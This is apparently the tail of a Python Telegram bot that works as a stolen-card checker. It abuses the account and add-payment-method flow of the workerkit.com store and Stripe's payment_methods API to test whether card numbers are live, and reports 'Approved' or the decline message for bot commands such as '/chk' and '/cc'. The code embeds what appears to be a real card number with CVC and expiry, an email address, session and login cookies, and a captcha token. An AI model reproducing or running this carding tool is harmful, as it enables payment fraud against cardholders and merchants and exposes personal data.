	    'wc_order_attribution_utm_term': '(none)',
	    'wc_order_attribution_utm_source_platform': '(none)',
	    'wc_order_attribution_utm_creative_format': '(none)',
	    'wc_order_attribution_utm_marketing_tactic': '(none)',
	    'wc_order_attribution_session_entry': 'https://www.workerkit.com/my-account/add-payment-method/',
	    'wc_order_attribution_session_start_time': '2024-08-24 07:46:27',
	    'wc_order_attribution_session_pages': '15',
	    'wc_order_attribution_session_count': '1',
	    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'metorik_source_type': 'typein',
	    'metorik_source_url': '(none)',
	    'metorik_source_mtke': '',
	    'metorik_source_utm_campaign': '(none)',
	    'metorik_source_utm_source': '(direct)',
	    'metorik_source_utm_medium': '(none)',
	    'metorik_source_utm_content': '(none)',
	    'metorik_source_utm_id': '(none)',
	    'metorik_source_utm_term': '(none)',
	    'metorik_source_session_entry': 'https://www.workerkit.com/my-account/add-payment-method/',
	    'metorik_source_session_start_time': '2024-08-24 07:46:27',
	    'metorik_source_session_pages': '16',
	    'metorik_source_session_count': '1',
	    '_wpnonce': nonce,
	    '_wp_http_referer': '/my-account/add-payment-method/',
	    'register': 'Register',
	}
	
	response = ses.post('https://www.workerkit.com/my-account/add-payment-method/', params=params, headers=headers, data=data)
	cookies=(ses.cookies)
	nonce_add=(response.text.split('add_card_nonce":"')[1].split('"')[0])
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = 'type=card&billing_details[name]=+&billing_details[email]=visasph7%40gmail.com&card[number]=4430400056441060&card[cvc]=313&card[exp_month]=05&card[exp_year]=26&guid=4b356589-cfc9-4ce3-bacd-87a9aabfab2d607329&muid=dc6189de-a74f-4dd6-9ff2-309029ec317c1e9b75&sid=f56b0f31-a815-43cc-ab55-63f1810279268d87f9&payment_user_agent=stripe.js%2Fddbd33ac04%3B+stripe-js-v3%2Fddbd33ac04%3B+split-card-element&referrer=https%3A%2F%2Fwww.workerkit.com&time_on_page=126991&key=pk_live_51GholBG8PCD7UYBPuFidLoam9lWf3GizFLYytInafpBv36CFnpJ61SsJ7MBmuqcpqky9d9Tmk1ovboifO2lIxpI5005cLYIFLy&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiSnc1dTVXaThaejFoVE1xZUNPcTdNbnNjcUJscUcxdkxNU1dPTk9WSTlBd0Vua0dkaHczajhXSkFIdUZQbjhsTDhPV3JFOEpGeUlNa0ZwQTFGNm1hSGFWR21jd2t1dUZ2dXdnYVFHanhZRGZ1K2JCdlcyVzZoWktDSENPbGUzTUJuSmh5cER6dGlvZHVSK3M5a3VaU2UyVCtDdUVxV1BEb2RuNEFHYzZLQXZyclg3dW9USjl3TmNWUGEzeWZBY1N5K2xiUDJUdU03c1FORzdEaFZPK0d2eUN3WnBpeVB1WTFTeG9USHN5WEVBWGN2Ny9TZ050WjdCU05BY1hDKzExRHg3OFROYk1MT0p1dGcxRmJiTjdnVHFpejZ1ZEpiZVlpWHV3RENtZHllNk5KNXVHaEkvV2xMSVdweDYvYjQ5NG1neSt2UE8wd25qVVNZSjJObnd3TG9CVDJGK2RCVy9GMFBpeTMvVU1IWitUdjFXRGp6dERtT1BlK1RGUUFZRmNMYmd1VXE1bkxXSTdYTDJXNmd1Tm9nQlZZSVRqSHVvMytEUHlzV3JUVW54bStOS2NlT3FDenV5OVNteU9Ha3lpbUd1L2ZNZW1kenhwdTZIUHNBY3VJVjdBamlSV3pRVnBuMlo4L21jTytyN3ZndnU2QkNxSmV2eHBtTlQwUTJXQU5waVh0VUlZVkdTc25aLzB1Yk15K2FEbFUxWVFHUDVOTEIxOWViaktCcm5KMitETVYrYkIybmg5eUpCZFlkY0UrUlBLNDc5Y2o2UTZDcTVYQk9yNkZhOUNjNS9GazFmbGx5OGVZTlN1TjNqc2xBMXo5a04rQkM0VVVBUlpYRTd6dGkyQlQycmtZdnZVVWJkT0N0UE5zdzRmOGxZR2wvMDFhVHViN0RNUXNMN0ZodW05V3RVUjk3QzNCbmR6SnNSaXdCcFpKWjZrYS9aNEFQRVZ0c3RKdlI0S1pXU3hNb2IvYnM0VzJySVFaVTlPOGZEdU1iY2Z2SjNKUTR0UUI3S25neEJYWTFPUkNmWndYcTd0U1U4UFN6UHZMTjJwUHdHTWZCQ2YvYXA2VzV1MXFYWjhqUlJzVVltZlhoMVQ5VFdtekp2WGUrQ2JFd0pCMmtQbk14WGpCbWNpR1oxdGpJOVFYejVjaERzMzEwZlN1Q0tsVjZvUXdJZVVxaGI2VmU2V0p0NHBzZ294VEUrbC9GdGZtVHB6eDVVK3FnVnFMbndjOVRuZklad09mNi83OU83U2lsb2tPQjV5YVBINFF4Uld0NTlMR1ZVUEdaeUUvUW53Rzg3cUtlb0p4Uzhkd1RmMTRwazRUOXErU3JjTGhVajY0YWpyek1IM2tqSUpmVXcyMVRXaHlWSWoxd2FVciswV2M5YXRYWXIwaER4NE5FVUJTS2pTSllCeXgwL1F4LzZaaEtFSXVjeGdRT2F1TlpzMVhobmwvZHJTbWI4bThodGlqSlRrYkpQTUJzTUQ2eUF6Z0VTL1FRakZvR0R4NTU3QmV4RG5rRW4xT1ZKZ2l0cm1NNFlEUkdFSnZFdCtyUDlQRytJUnhYWjl5cTJQa2RvNzRkUk5adERKQ3pHby9ZYjRRUUcydkMzNENZY3NZbDQ5TllNUS9mYW1IaUFIOCtiRWlZVkd5ZEVySklFODYyZ0g0TzVsVXVHNUlMVWF3ay9IZnYwRDhidjV2SkF5M21GVFpjQVVaWXU1cHR2MVhyOUI5OXVLZHFnc2NVc3ZtVnZzY29MeEVieUJHa1BaRVZ4NEYxL2xhM2pocEl3bGVhRzA3TCsvZExTQTBXRWQ5SnJWekdSTUtORG1HWi9VVWtwZTQxYXFvZWpXbzA5VnBIamhydGJnOFRtQTl5WWxzZkFEZm5ZSE16ZVBycHc4bGhrVlVta0VobU5aQjhPaUJRbGF0UElsNkdWaDc5VGU4aGlGbzdpelFNU3EvZ2hidFJSZ1NLTUlGOHBPSENvWDFvZ1lCUnFvK0d0MG9aTWcrNEJNNlNsTWVlaHNHYUtORURwWFFYaHE5ZkFkRmdxT2lnejNsbEVQdm1OUEF3VTJkeE9WZjF2Q3YwR3Npa2NncG5pSHYwbHREUUowVW82UVo5allqUkxaL28wRHIvaVozcW9Mdi9qMkdqZ1JKUmdyaUp5Lzc4eGxqZFlQdUtoeFpYYzEvMU4zNUYwcTVnR3ZKNXlFYW1jUWgzdXRxamd1MTFpcW9yZHJzUXFJQndENXVBM1FzV2QvSnVMUEl3aHRiMXo5SXN0RWQ2SXNOMkR4TDhES2twTUoxMVordEk5ZlZmekZ4S2kvV2tvNnRtNDRBOWsxVCtWdFZkazkvM01sT09Za1VEelVyaFBLMEtFeEJZU3g2MUhaenVuQTZyL1hNSlE0N3VjZlZIaWxKeEpDbmRvVWRrZUNsOTU2UEZuS3lFdVNrZ2JQcWdhb2MvZnBYN04rTkltTUhiQ2ExVThhREtHNnZPbXpkSHUzV0pqZWN3aWJnbDJLZkNhell3OFhyL2JOVm80QjRiOXhETmFhdWtidWlQQkg2ME9zYXlodndWUFpHYUQwVitveWtxaHZVWTdoazVsS000WGxVRXhEcHIvNWJJZFhFV1F3QmlrM2xlQzFzMG1BM1daSGRielFHRDMyRGttbzVRdEV6V2VsNkpBMmdoTVRMYldUK2NHMFdmQ21xM1hJVDRWWjNqbUkvazNMdGQxMjZsZk05ZjJEOWs4VGVVQ2w1L2RzN2dId3I0aDRFSEM1SGZkaVRESHVDZ25NNlQ4L2tXMHNXdzhDd1RYY1BidThFMEJGNGRzT052NW9PNTRnOWp6dG9JVExpeGc9PSIsImV4cCI6MTcyNDQ4NTg4OSwic2hhcmRfaWQiOjUzNTc2NTU5LCJrciI6IjRjMGNlMDU4IiwicGQiOjAsImNkYXRhIjoiVHpJVnd5UmhRaVlucTE3NlQ2UFJHQUFNdmtxSEZHV20ydm1PTU9ZZXA2K1YxdTd5L0xrWlBJczM0LzkyRWVGRDIxNjluZ29BMlg5RDBCK2g4M0VBWlNoUFpzZXVlZFg4ckRGWFc4Rlh5YXlBSFJpVUo0bWkrNkJGZDRUTXdyMWR5S3R3MXVncE5wb3Z0K0RGUWlVMUFpSU5BZVV6MWt6RTdXNEo3NHB1UU5qMmwrZUdwNkYzZzVwS1hKNmlwdzZLVU1RejZTUkRlL2xLeG5NdCJ9.AzOtbmG4WP4DMNzwjizFHTVCfcZq-EPOC6cS8ktZG6I'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	id=(response.json()['id'])
	
	headers = {
	    'authority': 'www.workerkit.com',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'PHPSESSID=af77454001bef418cb6776b53507e063; soundestID=20240824074627-YcesvkOUKkqtQWaYGAFWM0XDtq1KbPsqvtVrecUK3qahqRPmk; omnisendSessionID=pkQiunOMHyPJRU-20240824074627; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-24%2007%3A46%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.workerkit.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-24%2007%3A46%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.workerkit.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _gid=GA1.2.1735481473.1724485589; __stripe_mid=dc6189de-a74f-4dd6-9ff2-309029ec317c1e9b75; __stripe_sid=f56b0f31-a815-43cc-ab55-63f1810279268d87f9; omnisend-form-623ee4618597cb849b422a1f-closed-at=2024-08-24T07:46:33.908Z; omnisendContactID=66c98ff417c309a221340fa5; wordpress_logged_in_9167173d96618c297e2cdfec2c81d895=visasph7%7C1725695221%7CdWJ5Vj2U8tyKRhyppWycp3WRV5v2SXtxWGt9wq0U2Qd%7C618d6b45f88b72751f32ac5fa0d73e4b4a3eced38497ad298a22171f642fd380; tk_ai=dmtWzCPz4jD44gdOXJ89jilI; _ga_B03N69P7WC=GS1.1.1724485587.1.1.1724485638.9.0.0; sbjs_session=pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.workerkit.com%2Fmy-account%2Fadd-payment-method%2F; tk_qs=; page-views=5; _ga=GA1.2.957135065.1724485588',
	    'origin': 'https://www.workerkit.com',
	    'referer': 'https://www.workerkit.com/my-account/add-payment-method/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'wc_stripe_create_setup_intent',
	}
	
	data = {
	    'stripe_source_id': id,
	    'nonce': nonce_add,
	}
	
	response = requests.post('https://www.workerkit.com/', params=params, cookies=cookies, headers=headers, data=data)
	try:
		st=(response.json()['status'])
		msg=response.json()['error']['message']
		res=(f'{st} :{msg}')
		if 'Your card could not be set up for future usage.' in res:return res
		else:return res
	except:return 'Approved'
	#This is how we add communications 
@bot.message_handler(func=lambda message: message.text.lower().startswith(('.chk', '/chk')) or message.text.lower().startswith(('.pp', '/pp')) or message.text.lower().startswith(('.cc', '/cc')))
def respond_to_vbv(message):
	current_time = time.time()
	message_time = message.date
	time_difference = current_time - message_time
	if not time_difference <= 3:
		return
	def my_function():
		id=message.from_user.id
		cmd=message.text.split(' ')[0].replace('.','/')
		cu(cmd,id,bot,message)
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
print('تم تشغيل البوت')
while True:
	try:
		bot.polling(none_stop=True)
	except Exception as e:
		print(f"حدث خطأ: {e}")